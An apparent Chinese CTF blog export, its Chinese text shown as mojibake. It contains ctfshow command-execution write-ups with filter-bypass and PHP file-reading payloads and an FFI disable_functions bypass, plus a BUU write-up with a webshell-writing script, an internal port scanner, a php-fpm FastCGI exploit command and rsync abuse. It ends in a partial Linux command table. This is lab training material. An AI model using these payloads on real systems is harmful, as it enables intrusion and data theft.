<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿‡æ»¤å¾ˆä¸¥æ ¼ï¼Œä½†æ˜¯ä¾æ—§å¯ä»¥ç»•è¿‡ï¼Œç”¨é€šé…ç¬¦å’Œbash</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure>

<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[@-[]æ˜¯linuxä¸‹çš„åŒ¹é…ç¬¦ï¼Œæ˜¯è¿›è¡ŒåŒ¹é…çš„å¤§å†™å­—æ¯</span><br></pre></td></tr></table></figure>

<p>èµ·ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç½‘é¡µï¼Œä¸Šä¼ æ–‡ä»¶æŠ“ä¸ªåŒ…ï¼Œå…·ä½“çŸ¥è¯†ç‚¹çœ‹æˆªå›¾</p>
<img src="/2020/09/22/ctfshowcommand/1.png" class="">

<h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\'|\"|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•è·Ÿ55åŒ</p>
<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">"cat "</span>.$c.<span class="string">".php"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æç¤ºflagåœ¨36.phpæ–‡ä»¶ä¸­ï¼Œæ— å­—æ¯æ•°å­—æ„é€ å‡º36</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="comment">#$((~$(()))) -1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(()))))))) 1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span></span><br></pre></td></tr></table></figure>

<h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡æµ‹è¯•ï¼Œå‘ç°å‘½ä»¤æ‰§è¡Œå‡½æ•°åŸºæœ¬ä¸Šéƒ½è¢«banäº†ï¼Œè¿™é‡Œè¦å¯»æ‰¾å…¶ä»–æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);</span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);</span><br><span class="line">å…¶ä»–å¸ˆå‚…çš„å§¿åŠ¿</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);          </span><br><span class="line">	readfile(<span class="string">"flag.php"</span>);</span><br></pre></td></tr></table></figure>

<h3 id="web59-web65"><a href="#web59-web65" class="headerlink" title="web59-web65"></a>web59-web65</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);<span class="comment">#é€šæ€</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);<span class="comment">#é€šæ€</span></span><br><span class="line">ä¸‹é¢çš„payloadæ¥è‡ª_yu_å¸ˆå‚…ï¼ˆæ„Ÿè°¢ï¼‰</span><br><span class="line">é€šè¿‡fopenè¯»æ–‡ä»¶å†…å®¹ï¼š</span><br><span class="line">å‡½æ•°ï¼š</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetss($a);<span class="keyword">echo</span> $line;&#125;       <span class="comment">//php7.3ç‰ˆæœ¬å è¯¥å‡½æ•°å·²ä¸å†è¢«ä½¿ç”¨</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fpassthru($a);                                      <span class="comment">//è¿‡59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fread($a,<span class="string">"1000"</span>);                                   <span class="comment">//è¿‡59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgets($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//è¿‡59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetc($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//è¿‡60</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;  <span class="comment">//è¿‡60</span></span><br><span class="line">å•ä¸€å‡½æ•°è¯»æ–‡ä»¶å†…å®¹ï¼š</span><br><span class="line">å‡½æ•°ï¼š</span><br><span class="line">file_get_contents()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br><span class="line">ç”¨æ³•ï¼š</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);           <span class="comment">//è¿‡58</span></span><br><span class="line">readfile(<span class="string">"flag.php"</span>);                         <span class="comment">//è¿‡58</span></span><br><span class="line">print_r(file(<span class="string">"flag.php"</span>));                    <span class="comment">//è¿‡59</span></span><br><span class="line">é€šè¿‡å¤åˆ¶ï¼Œé‡å‘½åè¯»å–phpæ–‡ä»¶å†…å®¹ï¼ˆå‡½æ•°æ‰§è¡Œåï¼Œè®¿é—®url/flag.txtï¼‰</span><br><span class="line">å‡½æ•°ï¼š</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line">ç”¨æ³•ï¼š</span><br><span class="line">copy(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);             <span class="comment">//è¿‡60</span></span><br><span class="line">rename(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);           <span class="comment">//è¿‡60</span></span><br></pre></td></tr></table></figure>

<h3 id="web66-web70"><a href="#web66-web70" class="headerlink" title="web66-web70"></a>web66-web70</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¸å¿ƒä»£ç éƒ¨åˆ†æ²¡æœ‰æ”¹å˜ï¼Œå˜å¾—æ˜¯æ–‡ä»¶ä½ç½®ï¼Œéœ€è¦å¯¹ç›®å½•ç»“æ„è¿›è¡Œæ‰«æ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);</span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);</span><br><span class="line"><span class="comment">#ç”±äºåé¢çš„æ–‡ä»¶éƒ½æ˜¯txtæ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨includeè¿›è¡ŒåŒ…å«</span></span><br><span class="line"></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);          <span class="comment">//è¿‡66-67                              </span></span><br><span class="line">c=$a=opendir(<span class="string">"/"</span>); <span class="keyword">while</span> (($file = readdir($a)) !== <span class="keyword">false</span>)&#123;<span class="keyword">echo</span> $file . <span class="string">"&lt;br&gt;"</span>; &#125;;highlight_file(<span class="string">"/flag.txt"</span>);                       <span class="comment">//è¿‡66-67</span></span><br></pre></td></tr></table></figure>

<h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">"/[0-9]|[a-z]/i"</span>,<span class="string">"?"</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„ä»£ç åšå‡ºäº†å°å˜åŒ–</p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šæŠŠè¯»åˆ°çš„å†…å®¹æ”¾åˆ°å†…å­˜å½“ä¸­ï¼Œå¹¶ä¸”ä¼šè¾“å‡ºè¿›è¡Œäº†æ­£åˆ™æ›¿æ¢åçš„å†…å®¹ï¼Œè¿˜æ˜¯æœ‰æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œè®©ç¨‹åºæå‰ç»“æŸé€€å‡ºå³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">exit</span>();||c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<h3 id="web72-çœ‹-yu-å¸ˆå‚…çš„blog"><a href="#web72-çœ‹-yu-å¸ˆå‚…çš„blog" class="headerlink" title="web72(çœ‹_yu_å¸ˆå‚…çš„blog)"></a>web72(çœ‹_yu_å¸ˆå‚…çš„blog)</h3><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h3><h3 id="web75-web76"><a href="#web75-web76" class="headerlink" title="web75-web76"></a>web75-web76</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">åˆ©ç”¨mysql load_fileè¯»æ–‡ä»¶   <span class="comment">//è¿‡75,76</span></span><br><span class="line">è¯»å–ç›®å½•</span><br><span class="line">$a=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">' '</span>);&#125;;</span><br><span class="line"></span><br><span class="line">è¯»å–æ–‡ä»¶</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  $dbh = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=ctftraining'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">  <span class="keyword">foreach</span>($dbh-&gt;query(<span class="string">'select load_file("/var/www/html/index.php")'</span>) <span class="keyword">as</span> $row) &#123;</span><br><span class="line">      <span class="keyword">echo</span>($row[<span class="number">0</span>]).<span class="string">"|"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $dbh = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">  <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">$FFIè¯»å–</span><br><span class="line">c=$ffi = FFI::cdef(<span class="string">"int system(char *command);"</span>, <span class="string">"libc.so.6"</span>);$a=<span class="string">'/readflag &gt; xxx.txt'</span>;$ffi-&gt;system($a);<span class="keyword">exit</span>();   <span class="comment">//è®¿é—®xxx.txt</span></span><br><span class="line">æ”¾ä¸€ç¯‡æ–‡ç« ï¼šhttps:<span class="comment">//www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>show</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf473831530_2018_web_virink_web</title>
    <url>/2020/07/22/ctf473831530-2018-web-virink-web/</url>
    <content><![CDATA[<p>é‡æ–°å¼€å§‹åˆ·é¢˜çš„ç¬¬ä¸€é“ï¼Œå¥½æ´»ï¼Œå¥½å¥½æ•´ï¼<a id="more"></a></p>
<p>å¼€é¢˜é€æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">'orange'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">20</span>) &#123;</span><br><span class="line">        exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br /&gt; IP : &#123;\$_SERVER['REMOTE_ADDR']&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/07/22/ctf473831530-2018-web-virink-web/1.png" class="">

<p>æ–‡ä»¶å­˜å‚¨è·¯å¾„å°±æ˜¯md5(orange.ip)</p>
<p>ä»æºç ä¸­å¯ä»¥çœ‹å‡ºè¦å†™é•¿åº¦&lt;20çš„shellï¼Œå‚è€ƒæ–‡ç« <a href="https://blog.csdn.net/iamsongyu/article/details/84483638" target="_blank" rel="noopener">https://blog.csdn.net/iamsongyu/article/details/84483638</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://273d5199-9497-4159-9388-3c9e34f963f4.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filename = [<span class="string">r'&gt;echo\ \\'</span>,</span><br><span class="line">            <span class="string">r"&gt;\'\&lt;\?php \\"</span>,</span><br><span class="line">            <span class="string">r'&gt;eval\('</span>,</span><br><span class="line">            <span class="string">r'&gt;\$_POST\[c\]\)'</span>,</span><br><span class="line">            <span class="string">r"&gt;\;\'\&gt;2.php"</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filename:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'cmd'</span>: i</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, params=params)</span><br><span class="line">    print(i, r.status_code)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="string">'ls -tr&gt;1.sh'</span>, <span class="string">'sh 1.sh'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'cmd'</span>: i</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, params=params)</span><br><span class="line">    print(i, r.status_code)</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ä¸Šé¢çš„è„šæœ¬å†™å…¥shellï¼Œè®¿é—®sandbox/xxx/2.phpå³å¯ï¼Œè¿™é‡Œç”¨èšå‰‘è¿ä¸Šï¼Œçœ‹ä¸€ä¸‹ä¸»æœºä¿¡æ¯</p>
<img src="/2020/07/22/ctf473831530-2018-web-virink-web/2.png" class="">

<p>ä¸‹é¢è¦è¿›è¡Œå†…ç½‘æ‰«æï¼Œæç¤ºå¯ä»¥ç”¨python3ï¼Œç”¨æ‰«æè„šæœ¬å³å¯ã€‚è¿™é‡Œæ ¹æ®buuä¸‹ä¸€ä¸ªipåœ°å€æ˜¯å†…ç½‘ï¼Œæ¨æµ‹å†…ç½‘ipä¸º173.202.77.11</p>
<p>æ‰«æå¼€æ”¾ç«¯å£</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'active_port.txt'</span>,<span class="string">'at'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">80</span>,<span class="number">65535</span>+<span class="number">1</span>):</span><br><span class="line">            ip = <span class="string">'173.202.77.11'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    print(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure>

<p>æ‰«å‡ºæœ‰ä¸‰ä¸ªå¼€æ”¾ç«¯å£åˆ†åˆ«æ˜¯80ï¼Œ873ï¼Œ9000ç«¯å£</p>
<p>è¿™é‡Œè¦ç”¨åˆ°pç¥çš„æ–‡ç« </p>
<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p>æ ¹æ®æ–‡ç« æè¿°ï¼ŒPHP-FPMé»˜è®¤ç›‘å¬9000ç«¯å£ï¼Œå¦‚æœè¿™ä¸ªç«¯å£æš´éœ²åœ¨å…¬ç½‘ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ fastcgiåè®®ï¼Œå’Œfpmè¿›è¡Œé€šä¿¡ï¼Œç›´æ¥ç”¨pç¥çš„expï¼Œæ–‡ç« ä¸­æœ‰ä¸‹è½½é“¾æ¥ï¼ŒæŠŠexpä¸Šä¼ åˆ°è·¯å¾„ä¸‹</p>
<p>è¿™é‡Œè¿˜è¦æ³¨æ„80ç«¯å£å¼€æ”¾ï¼Œæœ‰ä¸€ä¸ªredirect.phpæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 fpm.py 173.202.77.11 &#x2F;www&#x2F;redirect.php -c \&quot;&lt;?php system(&#39;ls &#x2F; -all&#39;);?&gt;\&quot;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/22/ctf473831530-2018-web-virink-web/3.png" class="">

<p>å¯ä»¥çœ‹åˆ°flagæ–‡ä»¶æ²¡æœ‰æƒé™è¯»å–</p>
<p>çœ‹å…¬å¼€çš„wpè¯´æ˜¯è¦ç”¨åˆ°873ç«¯å£çš„rsyncæœªæˆæƒè®¿é—®</p>
<p><a href="https://www.cnblogs.com/leixiao-/p/10227086.html" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/10227086.html</a></p>
<p>å…ˆè¯»å–ä¸€ä¸‹rsyncçš„é…ç½®æ–‡ä»¶</p>
<img src="/2020/07/22/ctf473831530-2018-web-virink-web/4.png" class="">

<p>é…ç½®ä¸­å®šä¹‰äº†srcæ¨¡å—å¹¶ä¸”è·¯å¾„æŒ‡å‘äº†æ ¹ç›®å½•ï¼Œèƒ½å¤Ÿè¯»å–æ–‡ä»¶å†…å®¹ï¼Œä¸‹é¢ç”¨åšå®¢é‡Œçš„æ–¹æ³•æœ¬åˆ†å‡ºflagæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 fpm.py 173.202.77.11 &#x2F;www&#x2F;redirect.php -c \&quot;&lt;?php system(&#39;rsync 127.0.0.1::src&#x2F;7h1s_i5_f14g &#x2F;tmp&#x2F;&#39;);?&gt;\&quot;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°±èƒ½åˆ°tmpè·¯å¾„ä¸‹è¯»å–flagäº†</p>
<img src="/2020/07/22/ctf473831530-2018-web-virink-web/5.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>linuxæŒ‡ä»¤</title>
    <url>/2020/01/15/linux%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<p>â€‹    Kaliå¸¸ç”¨çš„æŒ‡ä»¤åœ¨æ¯”èµ›ä¸­è¿˜æ˜¯ä¼šç»å¸¸ç”¨åˆ°çš„</p>
<a id="more"></a>ä¸ªäººæ¯”è¾ƒweakï¼Œåšçš„æ•´ç†å°±åªèƒ½å€Ÿé‰´å…¶ä»–åšä¸»çš„ï¼š

<h4 id="1-ç›®å½•å’Œæ–‡ä»¶å‘½ä»¤"><a href="#1-ç›®å½•å’Œæ–‡ä»¶å‘½ä»¤" class="headerlink" title="1.ç›®å½•å’Œæ–‡ä»¶å‘½ä»¤"></a>1.ç›®å½•å’Œæ–‡ä»¶å‘½ä»¤</h4><table>
<thead>
<tr>
<th align="center">å‘½ä»¤</th>
<th align="center">ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>cd/home</strong></td>
<td align="center"><strong>è¿›å…¥/homeç›®å½•</strong></td>
</tr>
<tr>
<td align="center"><strong>cd ../</strong></td>
<td align="center"><strong>è¿”å›ä¸Šä¸€çº§ç›®å½•</strong></td>
</tr>
<tr>
<td align="center"><strong>cd ../../</strong></td>
<td align="center"><strong>è¿”å›ä¸Šä¸¤çº§ç›®å½•</strong></td>
</tr>
<tr>
<td align="center"><strong>cd</strong></td>
<td align="center"><strong>è¿›å…¥ä¸ªäººä¸»ç›®å½•</strong></td>
</tr>
<tr>
<td align="center"><strong>cd ~user1</strong></td>
<td align="center"><strong>è¿›å…¥ä¸ªäººçš„ä¸»ç›®å½•</strong></td>
</tr>
<tr>
<td align="center"><strong>cd -</strong></td>
<td align="center"><strong>è¿”å›ä¸Šæ¬¡æ‰€åœ¨çš„ç›®å½•</strong></td>
</tr>
<tr>
<td align="center"><strong>pwd</strong></td>
<td align="center"><strong>æ˜¾ç¤ºå·¥ä½œè·¯å¾„</strong></td>
</tr>
<tr>
<td align="center"><strong>ls</strong></td>
<td align="center"><strong>æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶</strong></td>
</tr>
<tr>
<td align="center"><strong>ls -F</strong></td>
<td align="center"><strong>æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶</strong></td>
</tr>
<tr>
<td align="center"><strong>ls -l</strong></td>
<td align="center"><strong>æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•çš„è¯¦ç»†èµ„æ–™</strong></td>
</tr>
<tr>
<td align="center"><strong>ls -a</strong></td>
<td align="center"><strong>æ˜¾ç¤ºéšè—æ–‡ä»¶</strong></td>
</tr>
<tr>
<td align="center"><strong>ls [0-9]</strong></td>
<td align="center"><strong>æ˜¾ç¤ºåŒ…å«æ•°å­—çš„æ–‡ä»¶åå’Œç›®å½•å</strong></td>
</tr>
<tr>
<td align="center"><strong>tree</strong></td>
<td align="center"><strong>æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„</strong></td>
</tr>
<tr>
<td align="center"><strong>lstree</strong></td>
<td align="center"><strong>æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•æœ‰æ ¹ç›®å½•å¼€æ•£çš„æ ‘å½¢ç»“æ„</strong></td>
</tr>
</tbody></table>
<h4 id="mkdiråˆ›å»ºç›®å½•"><a href="#mkdiråˆ›å»ºç›®å½•" class="headerlink" title="mkdiråˆ›å»ºç›®å½•"></a>mkdiråˆ›å»ºç›®å½•</h4><table>
<thead>
<tr>
<th><strong>mkdir -p /tmp/dir1/dir2</strong></th>
<th><strong>åˆ›å»ºä¸€ä¸ªç›®å½•æ ‘</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>rm -f</strong></td>
<td><strong>åˆ é™¤ä¸€ä¸ªæ–‡ä»¶</strong></td>
</tr>
<tr>
<td><strong>rmdir</strong></td>
<td><strong>åˆ é™¤ä¸€ä¸ªç›®å½•</strong></td>
</tr>
<tr>
<td><strong>rm -rf</strong></td>
<td><strong>åˆ é™¤ä¸€ä¸ªç›®å½•å¹¶åŒæ—¶åˆ é™¤å…¶æ–‡ä»¶</strong></td>
</tr>
<tr>
<td><strong>mv</strong></td>
<td><strong>é‡å‘½åæˆ–è€…ç§»åŠ¨ä¸€ä¸ªç›®å½•</strong></td>
</tr>
<tr>
<td><strong>cp file1 file2</strong></td>
<td><strong>å¤åˆ¶ä¸€ä¸ªæ–‡ä»¶</strong></td>
</tr>
<tr>
<td><strong>cp dir/*</strong></td>
<td><strong>å¤åˆ¶ä¸€ä¸ªç›®å½•åˆ°å½“å‰å·¥ä½œç›®å½•</strong></td>
</tr>
<tr>
<td><strong>cp -a/tmp/dir*</strong></td>
<td><strong>å¤åˆ¶ä¸€ä¸ªç›®å½•åˆ°å½“å‰å·¥ä½œç›®å½•</strong></td>
</tr>
<tr>
<td><strong>cp -a dir1 dir2</strong></td>
<td><strong>å¤åˆ¶ä¸€ä¸ªç›®å½•</strong></td>
</tr>
<tr>
<td><strong>cp -f</strong></td>
<td><strong>å¼ºè¡Œå¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•</strong></td>
</tr>
</tbody></table>
<h4 id="touchåˆ›å»ºä¸€ä¸ªæ–‡ä»¶"><a href="#touchåˆ›å»ºä¸€ä¸ªæ–‡ä»¶" class="headerlink" title="touchåˆ›å»ºä¸€ä¸ªæ–‡ä»¶"></a>touchåˆ›å»ºä¸€ä¸ªæ–‡ä»¶</h4><table>
<thead>
<tr>
<th align="center"><strong>-a</strong></th>
<th align="center"><strong>åªæ›´æ”¹å­˜å‚¨æ—¶é—´</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>-c</strong></td>
<td align="center"><strong>ä¸å»ºç«‹ä»»ä½•æ¡£æ¡ˆ</strong></td>
</tr>
<tr>
<td align="center"><strong>-d</strong></td>
<td align="center"><strong>ä½¿ç”¨åˆ¶å®šçš„æ—¥æœŸï¼Œè€Œéç°åœ¨çš„æ—¶é—´</strong></td>
</tr>
<tr>
<td align="center"><strong>-f</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>-m</strong></td>
